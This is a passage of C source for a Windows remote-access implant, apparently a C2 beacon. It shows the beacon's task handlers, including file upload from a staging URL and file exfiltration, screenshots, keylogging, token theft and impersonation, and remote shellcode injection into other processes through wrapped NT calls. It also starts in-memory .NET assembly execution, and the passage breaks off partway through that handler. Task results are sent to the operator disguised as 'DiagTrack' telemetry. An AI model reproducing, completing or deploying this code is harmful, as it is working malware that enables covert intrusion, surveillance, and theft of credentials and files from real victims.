                char *rjson=(char*)HeapAlloc(GetProcessHeap(),0,jsz);
                if(rjson){
                    lt_strcpy(rjson,"{\"machineId\":\""); lt_strcat(rjson,session_id);
                    lt_strcat(rjson,"\",\"sessionId\":\""); lt_strcat(rjson,task_id);
                    lt_strcat(rjson,"\",\"timestamp\":\"T\",\"events\":[{\"type\":\"DiagTrack\",\"data\":\"");
                    if(b64) lt_strcat(rjson,b64);
                    lt_strcat(rjson,"\"}]}");
                    char rurl[512]; lt_strcpy(rurl,result_base); lt_strcat(rurl,session_id);
                    lt_strcat(rurl,"/"); lt_strcat(rurl,task_id);
                    PBYTE pr=POLY_HTTPPOST(rurl,(PBYTE)rjson,lt_strlen(rjson),NULL);
                    if(pr) HeapFree(GetProcessHeap(),0,pr);
                    HeapFree(GetProcessHeap(),0,rjson);
                }
                if(b64) HeapFree(GetProcessHeap(),0,b64);
            }
            HeapFree(GetProcessHeap(),0,task_raw);
            continue;

        /* upload <url> <dest_path>
         * Fetch raw bytes from a staging URL (no .enc decode) and write to disk. */
        } else if(lt_strpfx(command,"upload ")&&command[7]){
            const char *up_url=command+7;
            int _usp=0; while(up_url[_usp]&&up_url[_usp]!=' ') _usp++;
            const char *up_dest=(up_url[_usp]==' '&&up_url[_usp+1])?(up_url+_usp+1):NULL;
            char up_urlbuf[512]; int _uub=0;
            while(_uub<511&&up_url[_uub]&&up_url[_uub]!=' '){up_urlbuf[_uub]=up_url[_uub];_uub++;} up_urlbuf[_uub]=0;
            const char *umsg;
            if(!up_dest){
                umsg="[-] upload: missing dest path\r\n";
            } else {
                DWORD flen=0;
                PBYTE fbytes=lt_http_raw_get(up_urlbuf,&flen);
                if(!fbytes||flen==0){
                    if(fbytes) HeapFree(GetProcessHeap(),0,fbytes);
                    umsg="[-] upload: fetch failed\r\n";
                } else {
                    WCHAR wdest[520]={0}; int _wdi=0;
                    while(up_dest[_wdi]&&_wdi<518){wdest[_wdi]=(WCHAR)(unsigned char)up_dest[_wdi];_wdi++;}
                    HANDLE huf=CreateFileW(wdest,GENERIC_WRITE,0,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
                    if(huf==INVALID_HANDLE_VALUE){
                        HeapFree(GetProcessHeap(),0,fbytes);
                        umsg="[-] upload: CreateFile failed\r\n";
                    } else {
                        DWORD written=0; WriteFile(huf,fbytes,flen,&written,NULL); CloseHandle(huf);
                        HeapFree(GetProcessHeap(),0,fbytes);
                        umsg=(written==flen)?"[+] upload: ok\r\n":"[-] upload: partial write\r\n";
                    }
                }
            }
            DWORD out_len=(DWORD)lt_strlen(umsg);
            PBYTE output=(PBYTE)HeapAlloc(GetProcessHeap(),0,out_len+2);
            if(output){for(DWORD _ui=0;_ui<=out_len;_ui++) output[_ui]=(BYTE)umsg[_ui];}
            _lt_post_task_result(session_id,task_id,result_base,output,out_len);
            if(output) HeapFree(GetProcessHeap(),0,output);
            HeapFree(GetProcessHeap(),0,task_raw);
            continue;

        /* download <src_path>
         * Read file from disk, return _BIN_B64:<base64> so CLI can save it. */
        } else if(lt_strpfx(command,"download ")&&command[9]){
            const char *dl_path=command+9;
            WCHAR wdl[520]={0}; int _wdli=0;
            while(dl_path[_wdli]&&_wdli<518){wdl[_wdli]=(WCHAR)(unsigned char)dl_path[_wdli];_wdli++;}
            HANDLE hdf=CreateFileW(wdl,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
            PBYTE output=NULL; DWORD out_len=0;
            if(hdf==INVALID_HANDLE_VALUE){
                const char *_em="[-] download: open failed\r\n";
                out_len=(DWORD)lt_strlen(_em);
                output=(PBYTE)HeapAlloc(GetProcessHeap(),0,out_len+2);
                if(output) for(DWORD _ei=0;_ei<=out_len;_ei++) output[_ei]=(BYTE)_em[_ei];
            } else {
                LARGE_INTEGER fsz; fsz.QuadPart=0; GetFileSizeEx(hdf,&fsz);
                if(fsz.QuadPart<=0||fsz.QuadPart>(50LL*1024*1024)){
                    CloseHandle(hdf);
                    const char *_em="[-] download: file too large or empty (50 MB limit)\r\n";
                    out_len=(DWORD)lt_strlen(_em);
                    output=(PBYTE)HeapAlloc(GetProcessHeap(),0,out_len+2);
                    if(output) for(DWORD _ei=0;_ei<=out_len;_ei++) output[_ei]=(BYTE)_em[_ei];
                } else {
                    DWORD fsz32=(DWORD)fsz.QuadPart;
                    PBYTE fbuf=(PBYTE)HeapAlloc(GetProcessHeap(),0,fsz32+4);
                    if(fbuf){
                        DWORD bread=0; ReadFile(hdf,fbuf,fsz32,&bread,NULL); CloseHandle(hdf); hdf=NULL;
                        DWORD b64fsz=((bread+2)/3)*4+4;
                        char *b64f=(char*)HeapAlloc(GetProcessHeap(),0,b64fsz);
                        if(b64f){
                            lt_b64encode(fbuf,bread,b64f);
                            HeapFree(GetProcessHeap(),0,fbuf); fbuf=NULL;
                            const char *_pfx="_BIN_B64:\n"; DWORD pfxlen=10;
                            out_len=pfxlen+(DWORD)lt_strlen(b64f);
                            output=(PBYTE)HeapAlloc(GetProcessHeap(),0,out_len+2);
                            if(output){
                                for(DWORD _pi=0;_pi<pfxlen;_pi++) output[_pi]=(BYTE)_pfx[_pi];
                                for(DWORD _bi=0;b64f[_bi];_bi++) output[pfxlen+_bi]=(BYTE)b64f[_bi];
                            }
                            HeapFree(GetProcessHeap(),0,b64f);
                        }
                        if(fbuf) HeapFree(GetProcessHeap(),0,fbuf);
                    }
                    if(hdf) CloseHandle(hdf);
                }
            }
            if(!output){
                const char *_em="[-] download: alloc failed\r\n";
                out_len=(DWORD)lt_strlen(_em);
                output=(PBYTE)HeapAlloc(GetProcessHeap(),0,out_len+2);
                if(output) for(DWORD _ei=0;_ei<=out_len;_ei++) output[_ei]=(BYTE)_em[_ei];
            }
            _lt_post_task_result(session_id,task_id,result_base,output,out_len);
            if(output) HeapFree(GetProcessHeap(),0,output);
            HeapFree(GetProcessHeap(),0,task_raw);
            continue;

        /* screenshot — GDI screen capture → BMP → _BIN_B64:<base64> */
        } else if(lt_strpfx(command,"screenshot")&&(command[10]==0||command[10]==' ')){
            DWORD bmp_len=0;
            PBYTE bmp=_lt_screenshot(&bmp_len);
            PBYTE output=NULL; DWORD out_len=0;
            if(!bmp||bmp_len==0){
                if(bmp) HeapFree(GetProcessHeap(),0,bmp);
                const char *_em="[-] screenshot: capture failed\r\n";
                out_len=(DWORD)lt_strlen(_em);
                output=(PBYTE)HeapAlloc(GetProcessHeap(),0,out_len+2);
                if(output) for(DWORD _ei=0;_ei<=out_len;_ei++) output[_ei]=(BYTE)_em[_ei];
            } else {
                DWORD b64bsz=((bmp_len+2)/3)*4+4;
                char *b64b=(char*)HeapAlloc(GetProcessHeap(),0,b64bsz);
                if(b64b){
                    lt_b64encode(bmp,bmp_len,b64b);
                    HeapFree(GetProcessHeap(),0,bmp); bmp=NULL;
                    const char *_pfx="_BIN_B64:\n"; DWORD pfxlen=10;
                    out_len=pfxlen+(DWORD)lt_strlen(b64b);
                    output=(PBYTE)HeapAlloc(GetProcessHeap(),0,out_len+2);
                    if(output){
                        for(DWORD _pi=0;_pi<pfxlen;_pi++) output[_pi]=(BYTE)_pfx[_pi];
                        for(DWORD _bi=0;b64b[_bi];_bi++) output[pfxlen+_bi]=(BYTE)b64b[_bi];
                    }
                    HeapFree(GetProcessHeap(),0,b64b);
                }
                if(bmp) HeapFree(GetProcessHeap(),0,bmp);
            }
            if(!output){
                const char *_em="[-] screenshot: encode failed\r\n";
                out_len=(DWORD)lt_strlen(_em);
                output=(PBYTE)HeapAlloc(GetProcessHeap(),0,out_len+2);
                if(output) for(DWORD _ei=0;_ei<=out_len;_ei++) output[_ei]=(BYTE)_em[_ei];
            }
            _lt_post_task_result(session_id,task_id,result_base,output,out_len);
            if(output) HeapFree(GetProcessHeap(),0,output);
            HeapFree(GetProcessHeap(),0,task_raw);
            continue;

        /* getuid — current user + elevation + impersonation state */
        } else if(lt_strpfx(command,"getuid")&&(command[6]==0||command[6]==' ')){
            char uid_buf[560]={0};
            /* Try GetUserNameExW (NameSamCompatible=2) for DOMAIN\user format */
            BOOL got_name=FALSE;
            {
                HMODULE hSec=GetModuleHandleA("Secur32.dll");
                if(!hSec) hSec=LoadLibraryA("Secur32.dll");
                if(hSec){
                    typedef BOOL(WINAPI*_pGUNEx)(DWORD,LPWSTR,PULONG);
                    _pGUNEx pGUNEx=(_pGUNEx)GetProcAddress(hSec,"GetUserNameExW");
                    if(pGUNEx){
                        WCHAR wfull[512]={0}; ULONG ulen2=511;
                        if(pGUNEx(2,wfull,&ulen2)){
                            int ux=0; while(wfull[ux]&&ux<510){uid_buf[ux]=(char)(wfull[ux]&0xFF);ux++;}
                            got_name=TRUE;
                        }
                    }
                }
            }
            if(!got_name){
                WCHAR wusr[256]={0}; DWORD ul=255; GetUserNameW(wusr,&ul);
                int ux=0; while(wusr[ux]&&ux<510){uid_buf[ux]=(char)(wusr[ux]&0xFF);ux++;}
            }
            HANDLE hTokG=NULL;
            if(OpenProcessToken(GetCurrentProcess(),TOKEN_QUERY,&hTokG)){
                TOKEN_ELEVATION te={0}; DWORD rl=0;
                GetTokenInformation(hTokG,TokenElevation,&te,sizeof(te),&rl);
                CloseHandle(hTokG);
                if(te.TokenIsElevated) lt_strcat(uid_buf," (elevated)");
            }
            HANDLE hImpG=NULL;
            if(OpenThreadToken(GetCurrentThread(),TOKEN_QUERY,TRUE,&hImpG)){
                lt_strcat(uid_buf," [impersonating]"); CloseHandle(hImpG);
            }
            lt_strcat(uid_buf,"\r\n");
            DWORD out_len=(DWORD)lt_strlen(uid_buf);
            PBYTE output=(PBYTE)HeapAlloc(GetProcessHeap(),0,out_len+2);
            if(output) for(DWORD _gi=0;_gi<=out_len;_gi++) output[_gi]=(BYTE)uid_buf[_gi];
            _lt_post_task_result(session_id,task_id,result_base,output,out_len);
            if(output) HeapFree(GetProcessHeap(),0,output);
            HeapFree(GetProcessHeap(),0,task_raw); continue;

        /* make_token DOMAIN\user password — LogonUser(NEW_CREDENTIALS) + ImpersonateLoggedOnUser */
        } else if(lt_strpfx(command,"make_token ")&&command[11]){
            const char *mt_a=command+11;
            int mt_sp=0; while(mt_a[mt_sp]&&mt_a[mt_sp]!=' ') mt_sp++;
            const char *mt_pw=(mt_a[mt_sp]==' ')?(mt_a+mt_sp+1):NULL;
            WCHAR mt_user[128]={0},mt_dom[128]={0},mt_pass[256]={0};
            int mt_bs=0; while(mt_a[mt_bs]&&mt_a[mt_bs]!='\\'&&mt_bs<mt_sp) mt_bs++;
            if(mt_a[mt_bs]=='\\'){
                int di=0; for(int xi=0;xi<mt_bs&&di<127;xi++){mt_dom[di++]=(WCHAR)(unsigned char)mt_a[xi];}
                int ui=0; for(int xi=mt_bs+1;xi<mt_sp&&ui<127;xi++){mt_user[ui++]=(WCHAR)(unsigned char)mt_a[xi];}
            } else {
                int ui=0; for(int xi=0;xi<mt_sp&&ui<127;xi++){mt_user[ui++]=(WCHAR)(unsigned char)mt_a[xi];}
                mt_dom[0]=L'.';
            }
            if(mt_pw){int pi=0;while(mt_pw[pi]&&pi<254){mt_pass[pi]=(WCHAR)(unsigned char)mt_pw[pi];pi++;}}
            HANDLE hMTok=NULL; BOOL mt_ok=FALSE;
            if(mt_user[0]&&mt_pass[0]){
                mt_ok=LogonUserW(mt_user,mt_dom,mt_pass,9,0,&hMTok); /* 9=LOGON32_LOGON_NEW_CREDENTIALS */
                if(mt_ok&&hMTok) ImpersonateLoggedOnUser(hMTok);
                lt_zero((PBYTE)mt_pass,sizeof(mt_pass));
            }
            if(hMTok) CloseHandle(hMTok);
            const char *mt_msg=mt_ok?"[+] make_token: thread impersonating new credentials\r\n"
                                    :"[-] make_token: LogonUser failed\r\n";
            DWORD out_len=(DWORD)lt_strlen(mt_msg);
            PBYTE output=(PBYTE)HeapAlloc(GetProcessHeap(),0,out_len+2);
            if(output) for(DWORD _mi=0;_mi<=out_len;_mi++) output[_mi]=(BYTE)mt_msg[_mi];
            _lt_post_task_result(session_id,task_id,result_base,output,out_len);
            if(output) HeapFree(GetProcessHeap(),0,output);
            HeapFree(GetProcessHeap(),0,task_raw); continue;

        /* steal_token <pid> — duplicate process token + ImpersonateLoggedOnUser */
        } else if(lt_strpfx(command,"steal_token ")&&command[12]){
            DWORD st_pid=0; int si=12;
            while(command[si]>='0'&&command[si]<='9'){st_pid=st_pid*10+(command[si++]-'0');}
            BOOL st_ok=FALSE;
            if(st_pid){
                CLIENT_ID st_cid={0}; st_cid.UniqueProcess=(HANDLE)(ULONG_PTR)st_pid;
                OBJECT_ATTRIBUTES st_oa={sizeof(OBJECT_ATTRIBUTES)};
                HANDLE hSP=NULL;
                if(NT_SUCCESS(POLY_NTOPEN(&hSP,PROCESS_QUERY_INFORMATION,&st_oa,&st_cid))&&hSP){
                    HANDLE hST=NULL;
                    if(OpenProcessToken(hSP,TOKEN_DUPLICATE|TOKEN_IMPERSONATE|TOKEN_QUERY,&hST)){
                        HANDLE hSD=NULL;
                        if(DuplicateTokenEx(hST,TOKEN_ALL_ACCESS,NULL,SecurityImpersonation,TokenImpersonation,&hSD)){
                            st_ok=ImpersonateLoggedOnUser(hSD)!=0;
                            CloseHandle(hSD);
                        }
                        CloseHandle(hST);
                    }
                    POLY_NTCLOSE(hSP);
                }
            }
            const char *st_msg=st_ok?"[+] steal_token: impersonating target process token\r\n"
                                    :"[-] steal_token: failed (need SeDebugPrivilege or PROCESS_QUERY_INFORMATION)\r\n";
            DWORD out_len=(DWORD)lt_strlen(st_msg);
            PBYTE output=(PBYTE)HeapAlloc(GetProcessHeap(),0,out_len+2);
            if(output) for(DWORD _si=0;_si<=out_len;_si++) output[_si]=(BYTE)st_msg[_si];
            _lt_post_task_result(session_id,task_id,result_base,output,out_len);
            if(output) HeapFree(GetProcessHeap(),0,output);
            HeapFree(GetProcessHeap(),0,task_raw); continue;

        /* rev2self — revert thread to process token */
        } else if(lt_strpfx(command,"rev2self")&&(command[8]==0||command[8]==' ')){
            RevertToSelf();
            static const char rv_msg[]="[+] rev2self: reverted to process token\r\n";
            DWORD out_len=(DWORD)(sizeof(rv_msg)-1);
            PBYTE output=(PBYTE)HeapAlloc(GetProcessHeap(),0,out_len+2);
            if(output) for(DWORD _ri=0;_ri<out_len;_ri++) output[_ri]=(BYTE)rv_msg[_ri];
            _lt_post_task_result(session_id,task_id,result_base,output,out_len);
            if(output) HeapFree(GetProcessHeap(),0,output);
            HeapFree(GetProcessHeap(),0,task_raw); continue;

        /* keylog start|stop|dump — in-process keystroke capture */
        } else if(lt_strpfx(command,"keylog")&&(command[6]==0||command[6]==' ')){
            const char *karg=(command[6]==' '&&command[7])?command+7:"dump";
            const char *kout=NULL;
            char kdump[LT_KLOG_CAP+64];
            if(lt_strpfx(karg,"start")){
                if(!InterlockedCompareExchange(&_lt_klog_run,1,0)){
                    _lt_klog_buf=(char*)HeapAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,LT_KLOG_CAP);
                    _lt_klog_used=0;
                    HANDLE ht=CreateThread(NULL,0,_lt_klog_thread_fn,NULL,0,NULL);
                    if(ht){_lt_klog_thread=ht; kout="[+] keylog: started\r\n";}
                    else{InterlockedExchange(&_lt_klog_run,0);kout="[-] keylog: thread failed\r\n";}
                } else kout="[!] keylog: already running\r\n";
            } else if(lt_strpfx(karg,"stop")){
                if(InterlockedCompareExchange(&_lt_klog_run,0,1)){
                    if(_lt_klog_thread){WaitForSingleObject(_lt_klog_thread,500);
                        CloseHandle(_lt_klog_thread);_lt_klog_thread=NULL;}
                    kout="[+] keylog: stopped\r\n";
                } else kout="[!] keylog: not running\r\n";
            } else { /* dump */
                DWORD used=_lt_klog_used;
                if(!_lt_klog_buf||used==0){kout="(empty)\r\n";}
                else{
                    const char *hdr="[keylog dump]\r\n";
                    int hl=15; for(int hi=0;hdr[hi];hi++,hl=hi);
                    hl=0; while(hdr[hl]) kdump[hl]=hdr[hl++];
                    for(DWORD ki=0;ki<used&&ki<LT_KLOG_CAP;ki++) kdump[hl++]=_lt_klog_buf[ki];
                    kdump[hl]=0; kout=kdump;
                }
            }
            DWORD out_len=(DWORD)lt_strlen(kout);
            PBYTE output=(PBYTE)HeapAlloc(GetProcessHeap(),0,out_len+2);
            if(output) for(DWORD _ki=0;_ki<out_len;_ki++) output[_ki]=(BYTE)kout[_ki];
            _lt_post_task_result(session_id,task_id,result_base,output,out_len);
            if(output) HeapFree(GetProcessHeap(),0,output);
            HeapFree(GetProcessHeap(),0,task_raw); continue;

        /* sleep <ms> — change beacon interval (0 = restore default) */
        } else if(lt_strpfx(command,"sleep ")&&command[6]){
            DWORD new_ms=0; int si2=6;
            while(command[si2]>='0'&&command[si2]<='9'){new_ms=new_ms*10+(command[si2++]-'0');}
            if(new_ms==0) new_ms=LT_C2_JITTER_MIN+(LT_C2_JITTER_MAX-LT_C2_JITTER_MIN)/2;
            _lt_sleep_base_ms=new_ms;
            char sl_msg[64]="[+] sleep: interval set to ";
            DWORD v=new_ms; char tmp[12]={0}; int ti=0;
            if(v==0){tmp[ti++]='0';}else{char tb[12]={0};int tb2=0;
                while(v>0){tb[tb2++]=(char)('0'+(v%10));v/=10;}
                for(int ri=tb2-1;ri>=0;ri--) tmp[ti++]=tb[ri];}
            for(int ci=0;tmp[ci];ci++) sl_msg[27+ci]=tmp[ci];
            int sllen=27+ti;
            sl_msg[sllen++]='m'; sl_msg[sllen++]='s'; sl_msg[sllen++]='\r'; sl_msg[sllen++]='\n';
            DWORD out_len=(DWORD)sllen;
            PBYTE output=(PBYTE)HeapAlloc(GetProcessHeap(),0,out_len+2);
            if(output) for(DWORD _sli=0;_sli<out_len;_sli++) output[_sli]=(BYTE)sl_msg[_sli];
            _lt_post_task_result(session_id,task_id,result_base,output,out_len);
            if(output) HeapFree(GetProcessHeap(),0,output);
            HeapFree(GetProcessHeap(),0,task_raw); continue;

        /* pwd — print working directory */
        } else if(lt_strpfx(command,"pwd")&&(command[3]==0||command[3]==' ')){
            WCHAR wp[520]={0}; GetCurrentDirectoryW(519,wp);
            char pwd_buf[520]={0}; int pwi=0;
            while(wp[pwi]&&pwi<517){pwd_buf[pwi]=(char)(wp[pwi]&0xFF);pwi++;}
            pwd_buf[pwi++]='\r'; pwd_buf[pwi++]='\n';
            DWORD out_len=(DWORD)pwi;
            PBYTE output=(PBYTE)HeapAlloc(GetProcessHeap(),0,out_len+2);
            if(output) for(DWORD _pwi=0;_pwi<(DWORD)pwi;_pwi++) output[_pwi]=(BYTE)pwd_buf[_pwi];
            _lt_post_task_result(session_id,task_id,result_base,output,out_len);
            if(output) HeapFree(GetProcessHeap(),0,output);
            HeapFree(GetProcessHeap(),0,task_raw); continue;

        /* cd <path> — change working directory */
        } else if(lt_strpfx(command,"cd ")&&command[3]){
            WCHAR wcd[520]={0}; int cdi=0;
            while(command[3+cdi]&&cdi<518){wcd[cdi]=(WCHAR)(unsigned char)command[3+cdi];cdi++;}
            const char *cd_msg=SetCurrentDirectoryW(wcd)?"[+] cd: ok\r\n":"[-] cd: failed\r\n";
            DWORD out_len=(DWORD)lt_strlen(cd_msg);
            PBYTE output=(PBYTE)HeapAlloc(GetProcessHeap(),0,out_len+2);
            if(output) for(DWORD _cdi=0;_cdi<=out_len;_cdi++) output[_cdi]=(BYTE)cd_msg[_cdi];
            _lt_post_task_result(session_id,task_id,result_base,output,out_len);
            if(output) HeapFree(GetProcessHeap(),0,output);
            HeapFree(GetProcessHeap(),0,task_raw); continue;

        /* ls [path] — directory listing with sizes */
        } else if(lt_strpfx(command,"ls")&&(command[2]==0||command[2]==' ')){
            const char *ls_src=(command[2]==' '&&command[3])?(command+3):".";
            WCHAR wls[520]={0}; int lsi=0;
            while(ls_src[lsi]&&lsi<514){wls[lsi]=(WCHAR)(unsigned char)ls_src[lsi];lsi++;}
            if(lsi>0&&wls[lsi-1]!='/'&&wls[lsi-1]!='\\'){wls[lsi]=L'\\';lsi++;}
            wls[lsi]=L'*'; wls[lsi+1]=0;
            WIN32_FIND_DATAW wfd; lt_zero(&wfd,sizeof(wfd));
            HANDLE hFnd=FindFirstFileW(wls,&wfd);
            DWORD ls_cap=8192,ls_used=0;
            char *ls_buf=(char*)HeapAlloc(GetProcessHeap(),0,ls_cap);
            if(!ls_buf||hFnd==INVALID_HANDLE_VALUE){
                if(hFnd!=INVALID_HANDLE_VALUE) FindClose(hFnd);
                if(ls_buf){HeapFree(GetProcessHeap(),0,ls_buf);ls_buf=NULL;}
                const char *_em="[-] ls: path not found\r\n";
                DWORD el=(DWORD)lt_strlen(_em);
                PBYTE eo=(PBYTE)HeapAlloc(GetProcessHeap(),0,el+2);
                if(eo) for(DWORD _ei=0;_ei<=el;_ei++) eo[_ei]=(BYTE)_em[_ei];
                _lt_post_task_result(session_id,task_id,result_base,eo,el);
                if(eo) HeapFree(GetProcessHeap(),0,eo);
                HeapFree(GetProcessHeap(),0,task_raw); continue;
            }
            do {
                char ent[560]={0}; int ei=0;
                if(wfd.dwFileAttributes&FILE_ATTRIBUTE_DIRECTORY){
                    const char *dt="<dir> ";
                    for(int di=0;dt[di];di++) ent[ei++]=dt[di];
                    for(int ni=0;wfd.cFileName[ni]&&ni<255;ni++)
                        ent[ei++]=(char)(wfd.cFileName[ni]&0xFF);
                } else {
                    ULARGE_INTEGER fsz2; fsz2.LowPart=wfd.nFileSizeLow; fsz2.HighPart=wfd.nFileSizeHigh;
                    char szbuf[24]={0}; ULONGLONG sv=fsz2.QuadPart; int szi=0;
                    if(sv==0){szbuf[0]='0';szi=1;}
                    else{char tmp3[24]={0};int ti3=0;
                        while(sv>0){tmp3[ti3++]=(char)('0'+(int)(sv%10));sv/=10;}
                        for(int ri3=ti3-1;ri3>=0;ri3--) szbuf[szi++]=tmp3[ri3];}
                    int pad=10-szi; while(pad-->0) ent[ei++]=' ';
                    for(int si3=0;si3<szi;si3++) ent[ei++]=szbuf[si3];
                    ent[ei++]=' ';
                    for(int ni=0;wfd.cFileName[ni]&&ni<255;ni++)
                        ent[ei++]=(char)(wfd.cFileName[ni]&0xFF);
                }
                ent[ei++]='\r'; ent[ei++]='\n';
                if(ls_used+(DWORD)ei+4>ls_cap){
                    DWORD nc=ls_cap*2+(DWORD)ei+64;
                    char *nb=(char*)HeapAlloc(GetProcessHeap(),0,nc);
                    if(nb){for(DWORD _ci=0;_ci<ls_used;_ci++) nb[_ci]=ls_buf[_ci];
                        HeapFree(GetProcessHeap(),0,ls_buf);ls_buf=nb;ls_cap=nc;}
                    else break;
                }
                for(int _ai=0;_ai<ei;_ai++) ls_buf[ls_used++]=(char)(unsigned char)ent[_ai];
            } while(FindNextFileW(hFnd,&wfd));
            FindClose(hFnd);
            if(ls_used==0){const char *_em2="(empty)\r\n";
                for(int _ei=0;_em2[_ei];_ei++) ls_buf[ls_used++]=(char)_em2[_ei];}
            PBYTE lo=(PBYTE)HeapAlloc(GetProcessHeap(),0,ls_used+2);
            if(lo) for(DWORD _li=0;_li<ls_used;_li++) lo[_li]=(BYTE)ls_buf[_li];
            HeapFree(GetProcessHeap(),0,ls_buf);
            _lt_post_task_result(session_id,task_id,result_base,lo,ls_used);
            if(lo) HeapFree(GetProcessHeap(),0,lo);
            HeapFree(GetProcessHeap(),0,task_raw); continue;

        /* inject <pid> <base64> — remote shellcode injection into target PID */
        } else if(lt_strpfx(command,"inject ")&&command[7]){
            const char *inj_arg=command+7;
            DWORD inj_pid=0; int inj_i=0;
            while(inj_arg[inj_i]>='0'&&inj_arg[inj_i]<='9'){
                inj_pid=inj_pid*10+(inj_arg[inj_i++]-'0');}
            if(inj_pid==0||inj_arg[inj_i]!=' '||!inj_arg[inj_i+1]){
                const char *em="[-] inject: usage: inject <pid> <base64_shellcode>\r\n";
                DWORD el=(DWORD)lt_strlen(em); PBYTE eo=(PBYTE)HeapAlloc(GetProcessHeap(),0,el+2);
                if(eo) for(DWORD _i=0;_i<=el;_i++) eo[_i]=(BYTE)em[_i];
                _lt_post_task_result(session_id,task_id,result_base,eo,el);
                if(eo) HeapFree(GetProcessHeap(),0,eo);
                HeapFree(GetProcessHeap(),0,task_raw); continue;
            }
            const char *inj_b64=inj_arg+inj_i+1;
            DWORD inj_b64_len=(DWORD)lt_strlen(inj_b64);
            DWORD inj_maxlen=(inj_b64_len*3)/4+8;
            PBYTE inj_heap=(PBYTE)HeapAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,inj_maxlen);
            DWORD inj_sc_len=inj_heap?lt_b64dec((const BYTE*)inj_b64,inj_b64_len,inj_heap):0;
            if(inj_sc_len<4){
                if(inj_heap) HeapFree(GetProcessHeap(),0,inj_heap);
                const char *em="[-] inject: shellcode decode failed\r\n";
                DWORD el=(DWORD)lt_strlen(em); PBYTE eo=(PBYTE)HeapAlloc(GetProcessHeap(),0,el+2);
                if(eo) for(DWORD _i=0;_i<=el;_i++) eo[_i]=(BYTE)em[_i];
                _lt_post_task_result(session_id,task_id,result_base,eo,el);
                if(eo) HeapFree(GetProcessHeap(),0,eo);
                HeapFree(GetProcessHeap(),0,task_raw); continue;
            }
            /* Open target process */
            HANDLE hInj=OpenProcess(PROCESS_VM_OPERATION|PROCESS_VM_WRITE|PROCESS_CREATE_THREAD,
                FALSE,inj_pid);
            if(!hInj){
                HeapFree(GetProcessHeap(),0,inj_heap);
                const char *em="[-] inject: OpenProcess failed — try steal_token first\r\n";
                DWORD el=(DWORD)lt_strlen(em); PBYTE eo=(PBYTE)HeapAlloc(GetProcessHeap(),0,el+2);
                if(eo) for(DWORD _i=0;_i<=el;_i++) eo[_i]=(BYTE)em[_i];
                _lt_post_task_result(session_id,task_id,result_base,eo,el);
                if(eo) HeapFree(GetProcessHeap(),0,eo);
                HeapFree(GetProcessHeap(),0,task_raw); continue;
            }
            PVOID inj_va=NULL; SIZE_T inj_sz=(SIZE_T)inj_sc_len;
            NTSTATUS inj_st=POLY_NTALLOC(hInj,&inj_va,0,&inj_sz,
                MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
            if(inj_st<0||!inj_va){
                CloseHandle(hInj); HeapFree(GetProcessHeap(),0,inj_heap);
                const char *em="[-] inject: remote alloc failed\r\n";
                DWORD el=(DWORD)lt_strlen(em); PBYTE eo=(PBYTE)HeapAlloc(GetProcessHeap(),0,el+2);
                if(eo) for(DWORD _i=0;_i<=el;_i++) eo[_i]=(BYTE)em[_i];
                _lt_post_task_result(session_id,task_id,result_base,eo,el);
                if(eo) HeapFree(GetProcessHeap(),0,eo);
                HeapFree(GetProcessHeap(),0,task_raw); continue;
            }
            POLY_NTWRITE(hInj,inj_va,inj_heap,(SIZE_T)inj_sc_len,NULL);
            HeapFree(GetProcessHeap(),0,inj_heap);
            ULONG inj_old=0;
            POLY_NTPROT(hInj,&inj_va,&inj_sz,PAGE_EXECUTE_READ,&inj_old);
            HANDLE inj_th=NULL;
            POLY_NTTHREAD(&inj_th,THREAD_ALL_ACCESS,NULL,hInj,
                (PVOID)inj_va,NULL,0,0,0x10000,0x10000,NULL);
            CloseHandle(hInj);
            char inj_resp[96]={0}; int inj_ri=0;
            const char *inj_pfx=inj_th?"[+] inject: shellcode running in pid "
                                       :"[-] inject: thread creation failed in pid ";
            for(int _ip=0;inj_pfx[_ip];_ip++) inj_resp[inj_ri++]=inj_pfx[_ip];
            char pidstr[12]={0}; lt_itoa(inj_pid,pidstr);
            for(int _ip2=0;pidstr[_ip2];_ip2++) inj_resp[inj_ri++]=pidstr[_ip2];
            inj_resp[inj_ri++]='\r'; inj_resp[inj_ri++]='\n';
            if(inj_th) POLY_NTCLOSE(inj_th);
            PBYTE inj_out=(PBYTE)HeapAlloc(GetProcessHeap(),0,(DWORD)inj_ri+2);
            if(inj_out) for(int _io=0;_io<inj_ri;_io++) inj_out[_io]=(BYTE)inj_resp[_io];
            _lt_post_task_result(session_id,task_id,result_base,inj_out,(DWORD)inj_ri);
            if(inj_out) HeapFree(GetProcessHeap(),0,inj_out);
            HeapFree(GetProcessHeap(),0,task_raw); continue;

        /* execasm <b64_assembly> [args] — run .NET assembly in-memory, capture stdout
         * Decodes b64 assembly, writes to %TEMP%, runs via dotnet with pipe capture,
         * captures stdout/stderr, deletes temp file, returns output. */
        } else if(lt_strpfx(command,"execasm ")&&command[8]){
            const char *ea_arg=command+8;
            /* split: first token is b64, remainder is args */
            int ea_b64_end=0;
            while(ea_arg[ea_b64_end]&&ea_arg[ea_b64_end]!=' ') ea_b64_end++;
            DWORD ea_b64_len=(DWORD)ea_b64_end;
            DWORD ea_maxsz=(ea_b64_len*3)/4+8;
            PBYTE ea_bytes=(PBYTE)HeapAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,ea_maxsz);
            if(!ea_bytes){
                const char *em="[-] execasm: alloc failed\r\n"; DWORD el=(DWORD)lt_strlen(em);
                PBYTE eo=(PBYTE)HeapAlloc(GetProcessHeap(),0,el+2);
                if(eo) for(DWORD _i=0;_i<=el;_i++) eo[_i]=(BYTE)em[_i];
                _lt_post_task_result(session_id,task_id,result_base,eo,el);
                if(eo) HeapFree(GetProcessHeap(),0,eo);
                HeapFree(GetProcessHeap(),0,task_raw); continue;
            }
            DWORD ea_sz=lt_b64dec((const BYTE*)ea_arg,ea_b64_len,ea_bytes);
            if(ea_sz<4){
                HeapFree(GetProcessHeap(),0,ea_bytes);
                const char *em="[-] execasm: decode failed\r\n"; DWORD el=(DWORD)lt_strlen(em);
                PBYTE eo=(PBYTE)HeapAlloc(GetProcessHeap(),0,el+2);
                if(eo) for(DWORD _i=0;_i<=el;_i++) eo[_i]=(BYTE)em[_i];
                _lt_post_task_result(session_id,task_id,result_base,eo,el);
                if(eo) HeapFree(GetProcessHeap(),0,eo);
